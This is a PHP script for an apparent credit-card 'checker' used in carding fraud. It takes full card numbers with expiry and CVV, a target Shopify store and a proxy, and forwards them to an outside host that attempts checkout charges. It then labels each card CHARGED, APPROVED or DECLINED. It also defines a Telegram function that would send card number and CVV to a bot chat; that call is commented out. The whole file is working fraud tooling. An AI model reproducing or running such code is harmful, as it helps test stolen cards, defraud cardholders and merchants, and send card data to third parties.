<?php
header('Content-Type: application/json');

$start_time = microtime(true);

$card = isset($_GET['cc']) ? filter_var(trim($_GET['cc']), FILTER_SANITIZE_STRING) : '';
$site = isset($_GET['site']) ? filter_var(trim($_GET['site']), FILTER_SANITIZE_URL) : '';
$proxy = isset($_GET['proxy']) ? filter_var(trim($_GET['proxy']), FILTER_SANITIZE_STRING) : '';
$response_data = [
    'card' => $card,
    'site' => $site,
    'gateway' => 'N/A',
    'status' => 'INVALID_REQUEST',
    'price' => '0.00',
    'time' => '0ms',
    'proxy_status' => 'N/A',
    'proxy_ip' => 'N/A'
];
$is_valid_card = false;
if (!empty($card)) {
    $card_parts = explode("|", $card);
    if (count($card_parts) == 4) {
        $card_num = $card_parts[0];
        $month = $card_parts[1];
        $year = $card_parts[2];
        $cvv = $card_parts[3];

        if (preg_match("/^\d{16}$/", $card_num) && 
            preg_match("/^(0[1-9]|1[0-2])$/", $month) && 
            (preg_match("/^\d{2}$/", $year) || preg_match("/^\d{4}$/", $year)) && 
            preg_match("/^\d{3,4}$/", $cvv)) {
            $is_valid_card = true;
        }
    }
}

$is_valid_site = filter_var($site, FILTER_VALIDATE_URL) !== false;
if (!empty($card) && !empty($site)) {
    
    $api_url = 'http://legend.sonugamingop.tech/autosh.php';
    $params = [
        'cc' => $card,
        'site' => $site
    ];
    
    if (!empty($proxy)) {
        $params['proxy'] = $proxy;
    }
    
    $full_api_url = $api_url . '?' . http_build_query($params);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

    $output = curl_exec($ch);
    $curl_error = curl_error($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($curl_error) {
        $response_data['status'] = 'API_ERROR: CURL_ERROR - ' . $curl_error;
    } elseif ($http_code >= 400) {
        $response_data['status'] = 'API_ERROR: HTTP_CODE - ' . $http_code;
    } else {
        // Debug: Log the raw response
        error_log("API Response: " . $output);
        
        $data = json_decode($output, true);
        if ($data && json_last_error() === JSON_ERROR_NONE) {
            $api_response_status = strtoupper($data['Response'] ?? 'UNKNOWN_STATUS');
            $gateway = $data['Gateway'] ?? 'shopify_payments';
            $price = $data['Price'] ?? '2.00';
            $proxy_status = $data['ProxyStatus'] ?? 'N/A';
            $proxy_ip = $data['ProxyIP'] ?? 'N/A';
            
            $status_message = $api_response_status;
            $final_status_type = 'DECLINED'; 

            if (strpos($api_response_status, 'THANK YOU') !== false || strpos($api_response_status, 'ORDER_PLACED') !== false) {
                $status_message = 'ORDER_PLACED';
                $final_status_type = 'CHARGED'; 
            } elseif (strpos($api_response_status, '3DS') !== false || 
                      strpos($api_response_status, 'OTP_REQUIRED') !== false ||
                      strpos($api_response_status, '3DS_CC') !== false) {
                $status_message = '3DS CC';
                $final_status_type = 'APPROVED';
            } elseif (strpos($api_response_status, 'INSUFFICIENT_FUNDS') !== false || 
                      strpos($api_response_status, 'INCORRECT_CVC') !== false || 
                      strpos($api_response_status, 'INCORRECT_ZIP') !== false) {
                $status_message = $api_response_status;
                $final_status_type = 'APPROVED';
            } elseif (strpos($api_response_status, 'APPROVED') !== false || strpos($api_response_status, 'LIVE') !== false) {
                $status_message = $api_response_status;
                $final_status_type = 'APPROVED';
            } elseif (strpos($api_response_status, 'EXPIRED_CARD') !== false) {
                $status_message = 'EXPIRE_CARD';
                $final_status_type = 'DECLINED';
            } elseif (strpos($api_response_status, 'HANDLE IS EMPTY') !== false || 
                      strpos($api_response_status, 'DELIVERY RATES ARE EMPTY') !== false) {
                $status_message = '3DS CC';
                $final_status_type = 'APPROVED';
            } elseif (strpos($api_response_status, 'DECLINED') !== false || strpos($api_response_status, 'ERROR') !== false || strpos($api_response_status, 'INVALID') !== false || strpos($api_response_status, 'MISSING') !== false || strpos($api_response_status, 'JS') !== false) {
                $status_message = $api_response_status;
                $final_status_type = 'DECLINED';
            } else {
                $status_message = $api_response_status;
                $final_status_type = 'UNKNOWN_STATUS';
            }

            $response_data = [
                'card' => $card,
                'site' => $site,
                'gateway' => $gateway,
                'status' => $status_message,
                'price' => $price,
                'ui_status_type' => $final_status_type,
                'proxy_status' => $proxy_status,
                'proxy_ip' => $proxy_ip,
                'raw_api_response' => $api_response_status
            ]; 

            if ($final_status_type === 'CHARGED') {
                $cc = $card_num;
                $mes = $month;
                $ano = $year;
                $cvv = $cvv;
                $user_site_data = ['url' => $site];
                $status = $status_message;
                $logo = '✅';
                $amount = $price;
                $get_time_taken = function($start_time) {
                    $end_time = microtime(true);
                    return round($end_time - $start_time, 2);
                };

                $telegram_log_message = (
                    "<b>𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸𝗲𝗱....🇮🇳</b>\n\n" .
                    "<b>𝐂𝐚𝐫d:</b> <code>{$cc}|{$mes}|{$ano}|{$cvv}</code>\n" .
                    "<pre><b>𝐒𝐢𝐭𝐞:</b> " . ($user_site_data['url'] ?? 'Unknown') . "\n" .
                    "<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {$status_message}\n" .
                    "<b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {$status} {$logo}\n" .
                    "<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> {$gateway}\n" .
                    "<b>𝐀𝐦𝐨𝐮𝐧𝐭:</b> ".$amount."\n" .
                    "<b>𝐓𝐢𝐦𝐞:</b> " . $get_time_taken($start_time) . "s</pre>"
                );
                // send_telegram_log(TelegramConfig::BOT_TOKEN, TelegramConfig::CHAT_ID, $telegram_log_message);
            }

        } else {
            // Try to clean and fix the response
            $cleaned_output = trim($output);
            
            // Remove any HTML/PHP error messages before JSON
            if (strpos($cleaned_output, '{') !== false) {
                $json_start = strpos($cleaned_output, '{');
                $cleaned_output = substr($cleaned_output, $json_start);
            }
            
            // Try to find the end of JSON and remove any trailing content
            $json_end = strrpos($cleaned_output, '}');
            if ($json_end !== false) {
                $cleaned_output = substr($cleaned_output, 0, $json_end + 1);
            }
            
            // Attempt to decode cleaned JSON
            $data = json_decode($cleaned_output, true);
            
            if ($data && json_last_error() === JSON_ERROR_NONE) {
                // Successfully parsed cleaned JSON
                $api_response_status = strtoupper($data['Response'] ?? 'UNKNOWN_STATUS');
                $gateway = $data['Gateway'] ?? 'shopify_payments';
                $price = $data['Price'] ?? '2.00';
                $proxy_status = $data['ProxyStatus'] ?? 'N/A';
                $proxy_ip = $data['ProxyIP'] ?? 'N/A';
                
                $status_message = $api_response_status;
                $final_status_type = 'DECLINED';
                
                // Handle different response types
                if (strpos($api_response_status, 'CARD_DECLINED') !== false || 
                    strpos($api_response_status, 'DECLINED') !== false) {
                    $status_message = 'CARD_DECLINED';
                    $final_status_type = 'DECLINED';
                } elseif (strpos($api_response_status, '3DS') !== false || 
                          strpos($api_response_status, 'HANDLE IS EMPTY') !== false) {
                    $status_message = '3DS CC';
                    $final_status_type = 'APPROVED';
                } elseif (strpos($api_response_status, 'INSUFFICIENT_FUNDS') !== false || 
                          strpos($api_response_status, 'INCORRECT_CVC') !== false) {
                    $status_message = $api_response_status;
                    $final_status_type = 'APPROVED';
                }
                
                $response_data = [
                    'card' => $card,
                    'site' => $site,
                    'gateway' => $gateway,
                    'status' => $status_message,
                    'price' => $price,
                    'ui_status_type' => $final_status_type,
                    'proxy_status' => $proxy_status,
                    'proxy_ip' => $proxy_ip,
                    'raw_api_response' => $api_response_status
                ];
            } else {
                // Still failed - provide fallback response
                $response_data['status'] = 'API_TIMEOUT_OR_ERROR';
                $response_data['gateway'] = 'shopify_payments';
                $response_data['price'] = '0.00';
                $response_data['ui_status_type'] = 'DECLINED';
                $response_data['proxy_status'] = 'Dead';
                $response_data['proxy_ip'] = 'N/A';
                error_log("Final JSON Error: " . json_last_error_msg() . " | Cleaned Response: " . substr($cleaned_output, 0, 300));
            }
        }
    }
} elseif (!$is_valid_card) {
    $response_data['status'] = 'INVALID_CARD_FORMAT';
    $response_data['ui_status_type'] = 'API_ERROR';
} elseif (!$is_valid_site) {
    $response_data['status'] = 'INVALID_SITE_FORMAT';
    $response_data['ui_status_type'] = 'API_ERROR';
}

$end_time = microtime(true);
$total_time_ms = round(($end_time - $start_time) * 1000, 2);
$total_time_ms_int = (int)$total_time_ms;
$hours = floor($total_time_ms_int / (1000 * 60 * 60));
$minutes = floor(($total_time_ms_int % (1000 * 60 * 60)) / (1000 * 60));
$seconds = floor(($total_time_ms_int % (1000 * 60)) / 1000);
$milliseconds_remaining = $total_time_ms_int % 1000;
if ($hours > 0) {
    $time_display = sprintf("%02dH %02dM %02dS %03dms", $hours, $minutes, $seconds, $milliseconds_remaining);
} elseif ($minutes > 0) {
    $time_display = sprintf("%02dM %02dS %03dms", $minutes, $seconds, $milliseconds_remaining);
} elseif ($seconds > 0) {
    $time_display = sprintf("%02dS %03dms", $seconds, $milliseconds_remaining);
} else {
    $time_display = sprintf("%03dms", $milliseconds_remaining);
}
$response_data['time'] = $time_display;

// Clear any output buffers and ensure clean JSON response
if (ob_get_level()) {
    ob_clean();
}

echo json_encode($response_data);
exit();

function send_telegram_log($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}

echo json_encode($response_data);

?>

